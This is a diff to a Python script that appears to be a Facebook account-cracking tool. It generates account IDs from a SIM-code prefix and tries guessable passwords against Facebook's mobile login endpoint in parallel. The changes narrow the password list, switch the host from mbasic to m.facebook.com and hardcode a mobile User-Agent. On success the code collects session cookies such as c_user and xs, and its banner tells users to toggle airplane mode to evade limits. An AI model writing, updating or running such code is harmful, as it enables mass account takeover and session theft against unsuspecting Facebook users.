@@ -780,7 +780,7 @@ def NUM():
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       idf = kode+guru
-      pwv = [idf[:6],'57273200',idf[:8],idf,]
+      pwv = [idf[:6],'57273200']
       if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
@@ -1038,13 +1038,13 @@ def m2(idf,pwv):
    "pass":ps,
    "login":"Log In"}
    header_freefb ={
-   'Host': 'mbasic.facebook.com',
+   'Host': 'm.facebook.com',
    'Connection': 'keep-alive',
    'Content-Length': str(len(str(log_data))),
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'sec-ch-ua-model': '"SM-G950FD"',
    'sec-ch-ua-mobile': '?1',
-   'User-Agent': pro,
+   'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '400',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-FB-LSD': 'AVr0Bh-X_bY',
@@ -1055,14 +1055,14 @@ def m2(idf,pwv):
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua-platform': '"Android"',
    'Accept': '*/*',
-   'Origin': 'https://mbasic.facebook.com',
+   'Origin': 'https://m.facebook.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
-   'Referer': 'https://mbasic.facebook.com/',
+   'Referer': 'https://m.facebook.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'}#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb).text
+   lo = session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
